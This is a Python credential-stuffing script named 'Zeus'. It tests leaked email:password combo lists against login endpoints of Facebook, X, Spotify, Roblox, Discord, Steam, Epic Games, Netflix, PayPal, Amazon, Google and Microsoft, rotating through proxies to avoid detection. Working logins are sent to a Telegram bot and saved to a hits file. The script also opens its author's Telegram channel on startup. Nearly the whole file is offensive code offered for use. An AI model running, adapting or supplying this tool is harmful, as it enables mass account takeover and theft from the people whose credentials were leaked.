import os
import sys
import time
import json
import random
import hashlib
import threading
import webbrowser
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from colorama import Fore, Style, init

init(autoreset=True)

# ====================== OPEN CHANNEL ======================
webbrowser.open('https://t.me/R7Aih1')

# ====================== GLOBALS ======================
BOT_TOKEN = ""
CHAT_ID = ""
COMBO_FILE = "combos.txt"
PROXY_FILE = ""
MAX_WORKERS = 30
PROXY_WORKERS = 100
TIMEOUT = 10

PLATFORMS_ORDER = [
    "Roblox", "Minecraft", "Fortnite", "PUBG", "Free Fire", "Call of Duty",
    "EA Sports FC", "Valorant", "League of Legends", "Apex Legends",
    "Steam", "Epic Games", "Xbox", "PlayStation", "Discord", "Twitch",
    "Facebook", "Instagram", "TikTok", "Snapchat", "X (Twitter)",
    "Reddit", "Telegram", "YouTube", "WhatsApp", "LinkedIn",
    "Spotify", "Netflix", "YouTube Music", "Prime Video", "Disney+",
    "Crunchyroll", "Microsoft", "Outlook", "OneDrive", "Microsoft 365",
    "PayPal", "Amazon", "Google", "Apple"
]

counters = {p: 0 for p in PLATFORMS_ORDER}

stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "2fa": 0,
    "custom": 0,
    "bad": 0,
    "retries": 0,
    "start_time": 0,
    "elapsed": 0
}
stop_flag = threading.Event()
lock = threading.Lock()
hits = []

# ====================== PROXY STATE ======================
proxies_all = []
proxies_alive = []

# ====================== COLORS ======================
C = Fore.CYAN
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
M = Fore.MAGENTA
W = Fore.WHITE
RESET = Style.RESET_ALL

PINK   = "\033[38;5;213m"
PURPLE = "\033[38;5;135m"
WHITE  = "\033[38;5;15m"
GREEN  = "\033[38;5;46m"
RED    = "\033[38;5;196m"
BLUE   = "\033[38;5;39m"
DIM    = "\033[2m"
ORANGE = "\033[38;5;208m"


# ====================== PROXY FUNCTIONS ======================
def load_proxies_from_file(path):
    global proxies_all
    proxies_all = []
    if not os.path.isfile(path):
        return False
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if not line.startswith("http"):
                    line = f"http://{line}"
                proxies_all.append(line)
        return len(proxies_all) > 0
    except Exception:
        return False


def test_one_proxy(proxy_url):
    try:
        r = requests.get(
            "https://api.ipify.org?format=json",
            proxies={"http": proxy_url, "https": proxy_url},
            timeout=8,
            verify=False,
        )
        if r.status_code == 200:
            return (proxy_url, True)
    except Exception:
        pass
    return (proxy_url, False)


def check_proxies_alive():
    global proxies_alive
    if not proxies_all:
        return False

    proxies_alive = []
    total = len(proxies_all)
    lock_p = threading.Lock()

    with ThreadPoolExecutor(max_workers=PROXY_WORKERS) as ex:
        futures = {ex.submit(test_one_proxy, p): p for p in proxies_all}
        for fut in as_completed(futures):
            try:
                proxy_url, ok = fut.result(timeout=15)
                with lock_p:
                    if ok:
                        proxies_alive.append(proxy_url)
            except Exception:
                pass

    print(f"{PINK}[*] Proxies checked: {GREEN}{len(proxies_alive)}{PINK}/{WHITE}{total}{RESET}")
    return len(proxies_alive) > 0


def get_proxy():
    if not proxies_alive:
        return None
    p = random.choice(proxies_alive)
    return {"http": p, "https": p}


# ====================== PLATFORM CHECKERS ======================
def check_facebook(email, password):
    try:
        ua = "Dalvik/2.1.0 (Linux; U; Android 13; SM-G991B Build/TP1A.220624.014) [FBAN/FB4A;FBAV/470.0.0.50.132;FBBV/390349072;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_US;]"
        headers = {
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate",
            "x-fb-connection-quality": "EXCELLENT",
            "x-fb-friendly-name": "authenticate",
            "x-fb-http-engine": "Liger",
            "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        }
        data = {
            "email": email,
            "password": f"#PWD_FB4A:0:{int(time.time())}:{password}",
            "format": "json",
            "credentials_type": "password",
            "generate_session_cookies": "1",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "locale": "en_US",
            "client_country_code": "US",
        }
        r = requests.post("https://b-graph.facebook.com/auth/login",
                          headers=headers, data=data, timeout=TIMEOUT,
                          proxies=get_proxy()).json()
        if "session_key" in r:
            return "hit"
        err = r.get("error", {}).get("message", "")
        if "www.facebook.com" in err:
            return "2fa"
        if "Login approval" in str(r):
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_instagram(email, password):
    return check_facebook(email, password)


def check_twitter(email, password):
    try:
        session = requests.Session()
        r1 = session.post("https://api.x.com/1.1/guest/activate.json",
                          headers={"Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA"},
                          timeout=TIMEOUT, proxies=get_proxy())
        guest_token = r1.json().get("guest_token")
        if not guest_token:
            return "custom"

        headers = {
            "Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
            "x-guest-token": guest_token,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        payload = {"username": email, "password": password, "remember_me": True}
        r2 = session.post("https://api.x.com/1.1/onboarding/task.json",
                          headers=headers, json=payload, timeout=TIMEOUT,
                          proxies=get_proxy())
        if r2.status_code == 200:
            data = r2.json()
            if data.get("flow_token") or data.get("subtasks"):
                if "challenge" in str(data).lower():
                    return "2fa"
                return "hit"
        return "bad"
    except:
        return "custom"


def check_spotify(email, password):
    try:
        session = requests.Session()
        r1 = session.get("https://accounts.spotify.com/en/login",
                         timeout=TIMEOUT, proxies=get_proxy())
        csrf = session.cookies.get("csrf_token")
        if not csrf:
            return "custom"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {"username": email, "password": password, "csrf_token": csrf}
        r2 = session.post("https://accounts.spotify.com/api/login",
                          headers=headers, data=data, timeout=TIMEOUT,
                          proxies=get_proxy())
        if r2.status_code == 200:
            return "hit"
        return "bad"
    except:
        return "custom"


def check_roblox(email, password):
    try:
        session = requests.Session()
        r1 = session.post("https://auth.roblox.com/v2/login",
                          json={"ctype": "Username", "cvalue": email, "password": password},
                          headers={"User-Agent": "Mozilla/5.0"},
                          timeout=TIMEOUT, proxies=get_proxy())
        if r1.status_code == 200:
            data = r1.json()
            if data.get("user"):
                return "hit"
        if r1.status_code == 403:
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_discord(email, password):
    try:
        session = requests.Session()
        r1 = session.post("https://discord.com/api/v9/auth/login",
                          json={"login": email, "password": password, "undelete": False},
                          headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                          timeout=TIMEOUT, proxies=get_proxy())
        if r1.status_code == 200:
            data = r1.json()
            if data.get("token"):
                return "hit"
        if r1.status_code == 400 and "captcha" in r1.text.lower():
            return "2fa"
        if r1.status_code == 403:
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_epic_games(email, password):
    try:
        session = requests.Session()
        r1 = session.post("https://www.epicgames.com/id/api/login",
                          json={"email": email, "password": password, "rememberMe": True},
                          headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
                          timeout=TIMEOUT, proxies=get_proxy())
        if r1.status_code == 200:
            data = r1.json()
            if data.get("redirectUrl") or data.get("sid"):
                return "hit"
            if "mfa" in str(data).lower() or "otp" in str(data).lower():
                return "2fa"
        return "bad"
    except:
        return "custom"


def check_steam(email, password):
    try:
        session = requests.Session()
        r1 = session.get("https://store.steampowered.com/login/getrsakey/",
                         params={"username": email}, timeout=TIMEOUT,
                         proxies=get_proxy())
        rsa = r1.json()
        if not rsa.get("success"):
            return "custom"
        r2 = session.post("https://store.steampowered.com/login/dologin/",
                          data={"username": email, "password": password, "rsatimestamp": rsa.get("timestamp")},
                          timeout=TIMEOUT, proxies=get_proxy())
        data = r2.json()
        if data.get("success"):
            return "hit"
        if data.get("emailauth_needed") or data.get("twofactor_needed"):
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_netflix(email, password):
    try:
        session = requests.Session()
        session.get("https://www.netflix.com/login", timeout=TIMEOUT, proxies=get_proxy())
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = {"email": email, "password": password, "rememberMe": "true"}
        r1 = session.post("https://www.netflix.com/api/shakti/v1/login",
                          headers=headers, data=data, timeout=TIMEOUT,
                          proxies=get_proxy())
        if r1.status_code == 200:
            if "errorCode" not in r1.text:
                return "hit"
        return "bad"
    except:
        return "custom"


def check_paypal(email, password):
    try:
        session = requests.Session()
        session.get("https://www.paypal.com/signin", timeout=TIMEOUT, proxies=get_proxy())
        data = {"login_email": email, "login_password": password, "form_charset": "UTF-8"}
        r2 = session.post("https://www.paypal.com/signin/validate", data=data, timeout=TIMEOUT,
                          proxies=get_proxy())
        if r2.status_code == 200 and "error" not in r2.text.lower():
            return "hit"
        if "challenge" in r2.text.lower() or "verify" in r2.text.lower():
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_amazon(email, password):
    try:
        session = requests.Session()
        session.get("https://www.amazon.com/ap/signin", timeout=TIMEOUT, proxies=get_proxy())
        data = {"email": email, "password": password, "create": "0"}
        r1 = session.post("https://www.amazon.com/ap/signin",
                          data=data, timeout=TIMEOUT, proxies=get_proxy())
        if r1.status_code == 200:
            if "auth-error-message" not in r1.text:
                return "hit"
        if "otp" in r1.text.lower() or "verification" in r1.text.lower():
            return "2fa"
        return "bad"
    except:
        return "custom"


def check_google(email, password):
    try:
        session = requests.Session()
        session.get("https://accounts.google.com/ServiceLogin", timeout=TIMEOUT, proxies=get_proxy())
        data = {"Email": email, "Passwd": password, "continue": "https://myaccount.google.com/"}
        r2 = session.post("https://accounts.google.com/ServiceLoginAuth",
                          data=data, timeout=TIMEOUT, proxies=get_proxy())
        if r2.status_code == 200:
            if "challenge" in r2.url.lower() or "signin/v2/challenge" in r2.url.lower():
                return "2fa"
            if "myaccount" in r2.url.lower() or "myaccount" in r2.text.lower():
                return "hit"
        return "bad"
    except:
        return "custom"


def check_youtube(email, password):
    return check_google(email, password)


def check_outlook(email, password):
    try:
        session = requests.Session()
        r1 = session.post("https://login.live.com/ppsecure/post.srf",
                          data={"login": email, "passwd": password, "type": "11"},
                          headers={"User-Agent": "Mozilla/5.0"},
                          timeout=TIMEOUT, proxies=get_proxy())
        if r1.status_code == 200:
            if "SIGNIN" in r1.url or "account.live.com" in r1.url:
                return "2fa"
            if "outlook.live.com" in r1.url or "mail.live.com" in r1.url:
                return "hit"
        return "bad"
    except:
        return "custom"


def check_microsoft(email, password):
    return check_outlook(email, password)


def check_onedrive(email, password):
    return check_outlook(email, password)


def check_microsoft365(email, password):
    return check_outlook(email, password)


def _stub(email, password):
    return "custom"


# ====================== PLATFORM MAPPER ======================
PLATFORM_CHECKERS = {
    "Roblox": check_roblox,
    "Minecraft": _stub,
    "Fortnite": _stub,
    "PUBG": _stub,
    "Free Fire": _stub,
    "Call of Duty": _stub,
    "EA Sports FC": _stub,
    "Valorant": _stub,
    "League of Legends": _stub,
    "Apex Legends": _stub,
    "Steam": check_steam,
    "Epic Games": check_epic_games,
    "Xbox": check_outlook,
    "PlayStation": _stub,
    "Discord": check_discord,
    "Twitch": _stub,
    "Facebook": check_facebook,
    "Instagram": check_instagram,
    "TikTok": _stub,
    "Snapchat": _stub,
    "X (Twitter)": check_twitter,
    "Reddit": _stub,
    "Telegram": _stub,
    "YouTube": check_youtube,
    "WhatsApp": check_facebook,
    "LinkedIn": _stub,
    "Spotify": check_spotify,
    "Netflix": check_netflix,
    "YouTube Music": check_google,
    "Prime Video": check_amazon,
    "Disney+": _stub,
    "Crunchyroll": _stub,
    "Microsoft": check_microsoft,
    "Outlook": check_outlook,
    "OneDrive": check_onedrive,
    "Microsoft 365": check_microsoft365,
    "PayPal": check_paypal,
    "Amazon": check_amazon,
    "Google": check_google,
    "Apple": _stub,
}


# ====================== DISPLAY ======================
def render_ui():
    os.system("clear" if os.name == "posix" else "cls")
    print(f"{RED}════════════════════ [ Zeus ] ════════════════════{RESET}")
    for p in PLATFORMS_ORDER:
        cnt = counters[p]
        counter_color = GREEN if cnt > 0 else RED
        print(
            f"{PURPLE}[•]{RESET} "
            f"{WHITE}{p:<20}{RESET} "
            f"{PURPLE}>>>{RESET} "
            f"{counter_color}{{ {cnt} }}{RESET}"
        )
    print(f"{RED}══════════════════════════════════════════════════════{RESET}")
    print(f"{PURPLE}Hits:{RESET} {GREEN}{stats['hits']}{RESET}")
    print(f"{PURPLE}2FA:{RESET} {GREEN}{stats['2fa']}{RESET}")
    print(f"{PURPLE}Custom:{RESET} {GREEN}{stats['custom']}{RESET}")
    print(f"{PURPLE}Bad:{RESET} {GREEN}{stats['bad']}{RESET}")
    print(f"{PURPLE}Retries:{RESET} {GREEN}{stats['retries']}{RESET}")
    print(f"{RED}══════════════════════════════════════════════════════{RESET}")
    print(f"{PURPLE}@R7_36/ R7Aih1@")


# ====================== CONFIG ======================
def get_config():
    global BOT_TOKEN, CHAT_ID, COMBO_FILE, PROXY_FILE, MAX_WORKERS
    os.system("clear" if os.name == "posix" else "cls")
    print(f"\n{PINK}┌─────────────────────────────────────────")
    print(f"{PINK}┃ {PINK}[ TOOL SETTINGS ]")
    print(f"{PINK}┣─────────────────────────────────────────")

    BOT_TOKEN = input(f"{PINK}┃ {PINK}Bot Token       {PINK}>>> {RESET}").strip()
    while not BOT_TOKEN:
        BOT_TOKEN = input(f"{PINK}┃ {PINK}Bot Token       {PINK}>>> {RESET}").strip()

    CHAT_ID = input(f"{PINK}┃ {PINK}Chat ID         {PINK}>>> {RESET}").strip()
    while not CHAT_ID:
        CHAT_ID = input(f"{PINK}┃ {PINK}Chat ID         {PINK}>>> {RESET}").strip()

    print(f"{PINK}┣─────────────────────────────────────────")

    COMBO_FILE = input(f"{PINK}┃ {PINK}Combo File Path {PINK}>>> {RESET}").strip()
    while not COMBO_FILE:
        COMBO_FILE = input(f"{PINK}┃ {PINK}Combo File Path {PINK}>>> {RESET}").strip()

    print(f"{PINK}┣─────────────────────────────────────────")

    PROXY_FILE = input(f"{PINK}┃ {PINK}Proxy File Path {PINK}(or ENTER to skip) >>> {RESET}").strip()

    workers_input = input(f"{PINK}┃ {PINK}Threads {WHITE}(default 30) {PINK}>>> {RESET}").strip()
    if workers_input and workers_input.isdigit():
        MAX_WORKERS = int(workers_input)

    print(f"{PINK}└─────────────────────────────────────────\n")


# ====================== TELEGRAM ======================
def send_telegram(message):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    # المحاولة 1: بدون بروكسي
    # المحاولة 2: مع بروكسي
    for use_proxy in [False, True]:
        try:
            payload = {
                "chat_id": CHAT_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            }
            kwargs = {"data": payload, "timeout": 15}
            if use_proxy and proxies_alive:
                kwargs["proxies"] = {"http": random.choice(proxies_alive),
                                     "https": random.choice(proxies_alive)}
            r = requests.post(url, **kwargs)
            if r.status_code == 200 and r.json().get("ok"):
                return True
            else:
                print(f"\n{R}[TG ERROR] {r.status_code}: {r.text[:150]}{RESET}")
        except Exception as e:
            print(f"\n{R}[TG EXCEPTION] {str(e)[:100]}{RESET}")
            continue
    return False


# ====================== LOAD COMBOS ======================
def load_combos():
    if not os.path.exists(COMBO_FILE):
        print(f"{R}[❌] FILE NOT FOUND: {COMBO_FILE}")
        return []

    combos = []
    bad_patterns = [
        "c0mb0_val1d3combo",
        "check_v_a_l_i_d_e_c_o_m_b_o",
        "valid.eco.mb.o",
        "valide_combos",
        "t.me/",
        "UHQCombolist",
        "hotmailmixking",
    ]

    try:
        with open(COMBO_FILE, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if any(p.lower() in line.lower() for p in bad_patterns):
                    continue
                if ":" in line and "@" in line.split(":")[0]:
                    combos.append(line)
    except Exception as e:
        print(f"{R}Read error: {e}")
        return []

    seen = set()
    unique = []
    for c in combos:
        if c not in seen:
            seen.add(c)
            unique.append(c)
    print(f"{G}[✅] Loaded {len(unique)} combos")
    return unique


# ====================== WORKER ======================
def process_combo(email, password):
    for platform in PLATFORMS_ORDER:
        if stop_flag.is_set():
            return
        checker = PLATFORM_CHECKERS.get(platform, _stub)
        for attempt in range(2):
            try:
                result = checker(email, password)
                if result == "hit":
                    with lock:
                        counters[platform] += 1
                        stats["hits"] += 1
                        hits.append({"platform": platform, "email": email, "password": password})
                    send_telegram(
                        f"<b>حساب شغال OK ✅</b>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"<b>EMAIL :</b>\n"
                        f"<code>{email}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"<b>PASSWORD :</b>\n"
                        f"<code>{password}</code>\n"
                        f"━━━━━━━━━━━━━━━━━━\n"
                        f"<b>BY: @R7_36 ~ @R7Aih1</b>"
                    )
                    break
                elif result == "2fa":
                    with lock:
                        counters[platform] += 1
                        stats["2fa"] += 1
                    break
                elif result == "bad":
                    with lock:
                        stats["bad"] += 1
                    break
                else:
                    with lock:
                        stats["custom"] += 1
                    break
            except Exception:
                if attempt == 0:
                    with lock:
                        stats["retries"] += 1
                    time.sleep(0.5)
                    continue
                else:
                    with lock:
                        stats["custom"] += 1
                    break

    with lock:
        stats["checked"] += 1


# ====================== UI THREAD ======================
def ui_thread():
    while not stop_flag.is_set():
        render_ui()
        if stats["checked"] >= stats["total"] > 0:
            break
        time.sleep(1)


# ====================== MAIN ======================
def main():
    global stats
    get_config()
    stats["start_time"] = time.time()

    # اختبار تليجرام
    print(f"\n{PINK}[*] Testing Telegram connection...{RESET}")
    if send_telegram("<b>✅ Bot Started — Zeus Tool</b>"):
        print(f"{G}[✅] Telegram OK — hits will be delivered{RESET}")
    else:
        print(f"{R}[❌] Telegram FAILED — check Token / Chat ID / Internet{RESET}")

    if PROXY_FILE:
        if load_proxies_from_file(PROXY_FILE):
            print(f"{G}[+] Loaded {len(proxies_all)} proxies from file{RESET}")
            check_proxies_alive()
            if not proxies_alive:
                print(f"{Y}[!] No working proxies — running without proxy{RESET}")
        else:
            print(f"{R}[❌] Could not load proxy file: {PROXY_FILE}{RESET}")
            print(f"{Y}[!] Running without proxies{RESET}")
    else:
        print(f"{Y}[!] No proxy file — running without proxies{RESET}")

    print(f"\n{PINK}Loading combos...")
    combos = load_combos()
    if not combos:
        print(f"{R}[❌] No combos found!")
        return

    stats["total"] = len(combos)
    print(f"{G}[✅] Checking {stats['total']} combos across {len(PLATFORMS_ORDER)} platforms...")
    time.sleep(1)

    ui_t = threading.Thread(target=ui_thread, daemon=True)
    ui_t.start()

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = []
        for combo in combos:
            email, pwd = combo.split(":", 1)
            futures.append(ex.submit(process_combo, email.strip(), pwd.strip()))
        for f in as_completed(futures):
            if stop_flag.is_set():
                break
            try:
                f.result(timeout=TIMEOUT * 40)
            except Exception:
                pass

    stop_flag.set()
    stats["elapsed"] = time.time() - stats["start_time"]
    time.sleep(1)
    render_ui()

    if hits:
        with open("hits.txt", "w", encoding="utf-8") as f:
            for h in hits:
                f.write(f"{h['platform']}|{h['email']}|{h['password']}\n")

    send_telegram(
        f"📊 <b>Check Completed</b>\n\n"
        f"Hits: {stats['hits']}\n2FA: {stats['2fa']}\nCustom: {stats['custom']}\nBad: {stats['bad']}\n\n"
        f"Time: {stats['elapsed']:.2f}s"
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        stop_flag.set()
        print(f"\n{R}[!] Stopped")
